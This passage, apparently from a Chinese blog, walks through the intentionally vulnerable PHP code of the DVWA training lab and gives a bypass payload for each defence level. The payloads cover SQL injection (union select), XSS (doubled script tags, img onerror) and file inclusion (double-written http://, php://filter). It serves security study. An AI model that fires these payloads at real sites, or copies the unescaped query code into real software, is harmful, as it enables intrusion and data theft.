class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p> <code>$_REQUEST</code> 包含了 <code>$_GET</code>，<code>$_POST</code> 和 <code>$_COOKIE</code> 的数组，可以被远程用户篡改</p>
<p>is_object()** 函数用于检测变量是否是一个对象。PHP 版本要求: PHP 4, PHP 5, PHP 7</p>
<p>mysqli_error() 函数返回最近调用函数的最后一个错误描述</p>
<p>mysqli_fetch_assoc() 函数从结果集中取得一行作为关联数组,区分大小写</p>
<p>$_GLOBALS[“__mysqli_ston”]是规定使用的MySQL连接</p>
<p>从下图可以看出，它是完全没做防护就直接执行的</p>
<p><img src="/.io//Users\whites\AppData\Roaming\Typora\typora-user-images\image-20200404063154458.png" alt="image-20200404063154458"></p>
<p>所以就直接构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2&#x27; -- </span><br></pre></td></tr></table></figure>



<h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$id = $_POST[ &#x27;id&#x27; ];</span><br><span class="line"></span><br><span class="line">	$id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id);</span><br><span class="line"></span><br><span class="line">	$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;</span><br><span class="line">	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &#x27;&lt;pre&gt;&#x27; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">	// Get results</span><br><span class="line">	while( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">		// Display values</span><br><span class="line">		$first = $row[&quot;first_name&quot;];</span><br><span class="line">		$last  = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">		// Feedback for end user</span><br><span class="line">		$html .= &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// This is used later on in the index.php page</span><br><span class="line">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span><br><span class="line">$query  = &quot;SELECT COUNT(*) FROM users;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line">$number_of_rows = mysqli_fetch_row( $result )[0];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>mysqli_real_escape_string() 函数转义在 SQL 语句中使用的字符串中的特殊字符</p>
<p>这串代码，其实就只是做了这一个防护，也就是转义特殊字符</p>
<p>转义的字符串有：NUL（ASCII 0）、\n、\r、\、’、” 和 Control-Z</p>
<p>但是，这里它本来就是数字型注入，所以我们不需要 <code>&#39;</code> 闭合字符串，那<code>mysql_real_escape_string()</code> 的过滤就没什么用了</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 or 1=1 union select database(),2</span><br></pre></td></tr></table></figure>



<h2 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h2><p>high.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_SESSION [ &#x27;id&#x27; ] ) ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$id = $_SESSION[ &#x27;id&#x27; ];</span><br><span class="line"></span><br><span class="line">	// Check database</span><br><span class="line">	$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;;</span><br><span class="line">	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">	// Get results</span><br><span class="line">	while( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">		// Get values</span><br><span class="line">		$first = $row[&quot;first_name&quot;];</span><br><span class="line">		$last  = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">		// Feedback for end user</span><br><span class="line">		$html .= &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);		</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在sql语句中添加LIMIT1，以此限定每次输出的结果只有1个记录，不会输出所有记录</p>
<p>session-input.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpdefine( &#x27;DVWA_WEB_PAGE_TO_ROOT&#x27;, &#x27;../../&#x27; );require_once DVWA_WEB_PAGE_TO_ROOT . &#x27;dvwa/includes/dvwaPage.inc.php&#x27;;dvwaPageStartup( array( &#x27;authenticated&#x27;, &#x27;phpids&#x27; ) );$page = dvwaPageNewGrab();$page[ &#x27;title&#x27; ] = &#x27;SQL Injection Session Input&#x27; . $page[ &#x27;title_separator&#x27; ].$page[ &#x27;title&#x27; ];if( isset( $_POST[ &#x27;id&#x27; ] ) ) &#123;	$_SESSION[ &#x27;id&#x27; ] =  $_POST[ &#x27;id&#x27; ];	//$page[ &#x27;body&#x27; ] .= &quot;Session ID set!&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&quot;;	$page[ &#x27;body&#x27; ] .= &quot;Session ID: &#123;$_SESSION[ &#x27;id&#x27; ]&#125;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&quot;;	$page[ &#x27;body&#x27; ] .= &quot;&lt;script&gt;window.opener.location.reload(true);&lt;/script&gt;&quot;;&#125;$page[ &#x27;body&#x27; ] .= &quot;&lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;	&lt;input type=\&quot;text\&quot; size=\&quot;15\&quot; name=\&quot;id\&quot;&gt;	&lt;input type=\&quot;submit\&quot; name=\&quot;Submit\&quot; value=\&quot;Submit\&quot;&gt;&lt;/form&gt;&lt;hr /&gt;&lt;br /&gt;&lt;button onclick=\&quot;self.close();\&quot;&gt;Close&lt;/button&gt;&quot;;dvwaSourceHtmlEcho( $page );?&gt;</span><br></pre></td></tr></table></figure>

<p>因为high.php直接跳转到session-input.php函数中，所以直接看后者就ok,没有防护，那就和第一个一样了</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,database() #</span><br></pre></td></tr></table></figure>



<h2 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpif( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123;	// Check Anti-CSRF token	checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );	// Get input	$id = $_GET[ &#x27;id&#x27; ];	// Was a number entered?	if(is_numeric( $id )) &#123;		// Check the database		$data = $db-&gt;prepare( &#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27; );		$data-&gt;bindParam( &#x27;:id&#x27;, $id, PDO::PARAM_INT );		$data-&gt;execute();		$row = $data-&gt;fetch();		// Make sure only 1 result is returned		if( $data-&gt;rowCount() == 1 ) &#123;			// Get values			$first = $row[ &#x27;first_name&#x27; ];			$last  = $row[ &#x27;last_name&#x27; ];			// Feedback for end user			$html .= &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;		&#125;	&#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</span><br></pre></td></tr></table></figure>



<h1 id="xss注入"><a href="#xss注入" class="headerlink" title="xss注入"></a>xss注入</h1><h2 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123;	$default = $_GET[&#x27;default&#x27;];		# Do not allow script tags	if (stripos ($default, &quot;&lt;script&quot;) !== false) &#123;		header (&quot;location: ?default=English&quot;);		exit;	&#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>if括号内判断是否存在&lt;script字符串，如果不存在，就返回HTTP报头</p>
<p>涉及函数：</p>
<p>array_key_exists() 函数检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false</p>
<p>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）</p>
<p>header() 函数向客户端发送原始的 HTTP 报头</p>
<p>pyload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&quot;111&quot;)&gt;</span><br></pre></td></tr></table></figure>



<h2 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123;	# White list the allowable languages	switch ($_GET[&#x27;default&#x27;]) &#123;		case &quot;French&quot;:		case &quot;English&quot;:		case &quot;German&quot;:		case &quot;Spanish&quot;:			# ok			break;		default:			header (&quot;location: ?default=English&quot;);			exit;	&#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>这里，由于switch的加入，于是变成必须是default变量中的值，也就是French，English，German，Spanish才行否则就进行跳转结束运行；</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">default=German&amp;x=&lt;script&gt;alert(/123/)&lt;/script&gt;default=German#&lt;script&gt;alert(/123/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h2 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;	// Feedback for end user	$html .= &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>这里的话，他其实没做任何防护，所以，要做的，其实就是闭合html中的标签而已</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&quot;&gt;&lt;script&gt;alert(124)&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h2 id="0x04-2"><a href="#0x04-2" class="headerlink" title="0x04"></a>0x04</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;	// Get input	$name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] );	// Feedback for end user	$html .= &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>这里使用了<strong>str_replace</strong>函数，直接过滤**<script>**转换为空字符，可以试试叠加script</p>
<p>设计函数：</p>
<p>str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">12&quot;&gt;&lt;sc&lt;script&gt;ript&gt;alert(123)&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;	// Get input	$name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] );	// Feedback for end user	$html .= &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>使用正则过滤了script，大小写不区分</p>
<p>涉及函数：</p>
<p>preg_replace 函数执行一个正则表达式的搜索和替换</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&quot;&gt;&lt;img src=1 onerror=alert(124)&gt;</span><br></pre></td></tr></table></figure>



<h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;	// Check Anti-CSRF token	checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );	// Get input	$name = htmlspecialchars( $_GET[ &#x27;name&#x27; ] );	// Feedback for end user	$html .= &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</span><br></pre></td></tr></table></figure>

<p>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体</p>
<h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123;	// Get input	$message = trim( $_POST[ &#x27;mtxMessage&#x27; ] );	$name    = trim( $_POST[ &#x27;txtName&#x27; ] );	// Sanitize message input	$message = stripslashes( $message );	$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));	// Sanitize name input	$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));	// Update database	$query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;;	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );	//mysql_close();&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>涉及函数：</p>
<p>trim() 函数移除字符串两侧的空白字符或其他预定义字符</p>
<p>stripslashes() 函数删除由 addslashes() 函数添加的反斜杠</p>
<p>is_object() 函数用于检测变量是否是一个对象</p>
<h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123;	// Get input	$message = trim( $_POST[ &#x27;mtxMessage&#x27; ] );	$name    = trim( $_POST[ &#x27;txtName&#x27; ] );	// Sanitize message input	$message = strip_tags( addslashes( $message ) );	$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));	$message = htmlspecialchars( $message );	// Sanitize name input	$name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name );	$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));	// Update database	$query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;;	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );	//mysql_close();&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>涉及函数：</p>
<p>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签</p>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;	// Checks to see where the request came from	if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false ) &#123;		// Get input		$pass_new  = $_GET[ &#x27;password_new&#x27; ];		$pass_conf = $_GET[ &#x27;password_conf&#x27; ];		// Do the passwords match?		if( $pass_new == $pass_conf ) &#123;			// They do!			$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));			$pass_new = md5( $pass_new );			// Update the database			$insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;			$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );			// Feedback for the user			$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;		&#125;		else &#123;			// Issue with passwords matching			$html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;		&#125;	&#125;	else &#123;		// Didn&#x27;t come from a trusted source		$html .= &quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;;	&#125;	((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>stripos函数会验证请求头，但它写的头验证是可以绕过的，那，就仿造一个呗。stripos()函数是多次匹配； 只要包含了目标主机地址就可以绕过stripos()函数写的验证语句</p>
<p>如果我们依旧按照建立一个伪造的攻击页面，stripos()头验证就会验证，然而页面并不是来自DVWA；于是深挖stripos()函数的漏洞，发现函数会多次匹配，于是思路就是建立一个假的文件名，通过一个伪造的文件名，绕过stripos()的验证</p>
<p>$_SERVER[ ‘HTTP_REFERER’ ] 查询当前页的前一页的地址信息<br> $_SERVER[ ‘SERVER_NAME’ ] 获取域名<br> stripos ()函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）</p>
<h2 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;	// Check Anti-CSRF token	checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );	// Get input	$pass_new  = $_GET[ &#x27;password_new&#x27; ];	$pass_conf = $_GET[ &#x27;password_conf&#x27; ];	// Do the passwords match?	if( $pass_new == $pass_conf ) &#123;		// They do!		$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));		$pass_new = md5( $pass_new );		// Update the database		$insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;		$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );		// Feedback for the user		$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;	&#125;	else &#123;		// Issue with passwords matching		$html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;	&#125;	((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</span><br></pre></td></tr></table></figure>

<p>未完。。。。。</p>
<h1 id="文件包含、上传，目录穿越"><a href="#文件包含、上传，目录穿越" class="headerlink" title="文件包含、上传，目录穿越"></a>文件包含、上传，目录穿越</h1><h2 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h2><p>require:找不到被包含的文件，报错，并且停止运行脚本。</p>
<p>include:找不到被包含的文件,只会报错，但会继续运行脚本。</p>
<p>require_once:与require类似,区别在于当重复调用同一文件时,程序只调用一次。</p>
<p>include_once:与include类似,区别在于当重复调用同一文件时,程序只调用一次。</p>
<h2 id="0x01-4"><a href="#0x01-4" class="headerlink" title="0x01"></a>0x01</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Input validation$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );?&gt;</span><br></pre></td></tr></table></figure>

<p>过滤了</p>
<p>http:// </p>
<p>https://</p>
<p>../</p>
<p>..\</p>
<p>通过双写来绕过，或者使用绝对路径来绕过，也可以试试编码绕过</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hthttp://tp://127.0.0.1/2.txt</span><br></pre></td></tr></table></figure>



<h2 id="0x02-4"><a href="#0x02-4" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Input validationif( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123;	// This isn&#x27;t the page we want!	echo &quot;ERROR: File not found!&quot;;	exit;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>fnmatch() 函数根据指定的模式来匹配文件名或字符串</p>
<p>想起没有phpstudy的时候，访问自己的本地文件，前面总会出现file:///</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///C:\phpStudy\PHPTutorial\WWW\2.txt利用php://来读取文件php://filter/read=convert.base64-encode/resource=C:\phpStudy\PHPTutorial\WWW\2.txt</span><br></pre></td></tr></table></figure>



<h2 id="0x03-3"><a href="#0x03-3" class="headerlink" title="0x03"></a>0x03</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Only allow include.php or file&#123;1..3&#125;.phpif( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123;   // This isn&#x27;t the page we want!   echo &quot;ERROR: File not found!&quot;;   exit;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>才疏学浅，告辞</p>
<h2 id="0x04-3"><a href="#0x04-3" class="headerlink" title="0x04"></a>0x04</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123;	// Where are we going to be writing to?	$target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;	$target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] );	// File information	$uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ];	$uploaded_type = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;type&#x27; ];	$uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ];	// Is it an image?	if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp;		( $uploaded_size &lt; 100000 ) ) &#123;		// Can we move the file to the upload folder?		if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123;			// No			$html .= &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;;		&#125;		else &#123;			// Yes!			$html .= &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;		&#125;	&#125;	else &#123;		// Invalid file		$html .= &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;;	&#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>strrpos() 函数查找字符串在另一字符串中最后一次出现的位置</p>
<p>strrpos() 函数对大小写敏感</p>
<p>strtolower() 函数把字符串转换为小写</p>
<p>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息</p>
<p>getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度</p>
<h2 id="0x05-1"><a href="#0x05-1" class="headerlink" title="0x05"></a>0x05</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123;	// Where are we going to be writing to?	$target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;	$target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] );	// File information	$uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ];	$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1);	$uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ];	$uploaded_tmp  = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ];	// Is it an image?	if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == 